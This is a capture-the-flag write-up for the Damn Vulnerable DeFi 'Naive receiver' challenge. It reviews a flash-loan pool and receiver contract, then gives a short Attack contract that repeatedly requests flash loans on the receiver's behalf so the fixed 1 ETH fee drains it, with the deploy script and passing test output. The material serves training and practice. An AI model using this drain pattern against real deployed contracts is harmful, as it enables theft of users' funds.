<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/2.png">

# Target Contract Review

Given contracts.

**FlashLoanReceiver.sol**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver is IERC3156FlashBorrower {

    address private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        assembly { // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
        
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal { }

    // Allow deposits of ETH
    receive() external payable {}
}
```
This contract is a Flash Loan receiver, which means it can borrow funds temporarily from a lending pool and execute actions with those funds within a single transaction.

`onFlashLoan()` : This function is the callback function that is called when the flash loan is executed. It takes the flash loan details as parameters: the address of the token being borrowed, the amount of the loan, the fee charged by the lending pool, and additional data.

The function first checks if the caller of the function is the lending pool. If not, it reverts the transaction to prevent unauthorized access. Next, it checks if the token being borrowed is ETH. If not, it reverts the transaction as this contract only supports borrowing ETH.

The `_executeActionDuringFlashLoan` function is a placeholder internal function that can be overridden by inheriting contracts to define the actions to be performed with the borrowed funds. After executing the actions, the contract transfers the borrowed amount plus the fee back to the lending pool using the `SafeTransferLib.safeTransferETH` function.

The contract also includes a `receive()` function that allows the contract to receive ETH deposits.

**NaiveReceiverLenderPool.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error UnsupportedCurrency();
    error CallbackFailed();

    function maxFlashLoan(address token) external view returns (uint256) {
        if (token == ETH) {
            return address(this).balance;
        }
        return 0;
    }

    function flashFee(address token, uint256) external pure returns (uint256) {
        if (token != ETH)
            revert UnsupportedCurrency();
        return FIXED_FEE;
    }

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 balanceBefore = address(this).balance;

        // Transfer ETH and handle control to receiver
        SafeTransferLib.safeTransferETH(address(receiver), amount);
        if(receiver.onFlashLoan(
            msg.sender,
            ETH,
            amount,
            FIXED_FEE,
            data
        ) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (address(this).balance < balanceBefore + FIXED_FEE)
            revert RepayFailed();

        return true;
    }

    // Allow deposits of ETH
    receive() external payable {}
}
```

The NaiveReceiverLenderPool contract is a flash loan pool that allows users to borrow ETH using the flash loan mechanism.

`maxFlashLoan()` : It returns the maximum amount that can be borrowed in a flash loan, while the flashFee function calculates the fee to be charged for a flash loan.

`flashFee()` : It returns the fee that needs to be paid for a flash loan. In this case, it returns a fixed fee of 1 ETH.

`flashLoan()` : It provides the flash loan functionality. It takes the borrower's address, the token to be borrowed (in this case, only ETH is supported), the amount to be borrowed, and any additional data required by the borrower.

Inside the function, it first checks if the token is supported (only ETH is supported in this case). It then transfers the requested amount of ETH to the borrower's address. After that, it calls the borrower's onFlashLoan function, passing the necessary parameters. If the borrower's callback function returns the CALLBACK_SUCCESS value, it checks if the contract's balance is greater than or equal to the initial balance plus the fixed fee. If not, it reverts the transaction.


The `receive()` function is a fallback function that allows the contract to receive ETH deposits.

Overall, this contract provides a basic implementation of a flash loan provider, allowing users to borrow ETH from the contract as long as it is returned within the same transaction.

Challenge's message:

> There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH. A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.
Take all ETH out of the user’s contract. If possible, in a single transaction.

# Suberting

When we look


```solidity
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attack {
    constructor(address payable _pool, address payable _receiver){
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
        address ETH = pool.ETH();
        for(uint256 i=0; i<10; i++){
            pool.flashLoan(IERC3156FlashBorrower(_receiver), ETH, 1, "0x");
        }
    }
}
```

```js
const AttackFactory = await ethers.getContractFactory('Attack', deployer);
attack = await AttackFactory.deploy(pool.address, receiver.address);
```

```powershell
  [Challenge] Naive receiver
    ✔ Execution (294ms)


  1 passing (2s)

Done in 2.88s.
```

**_by wasny0ps_**
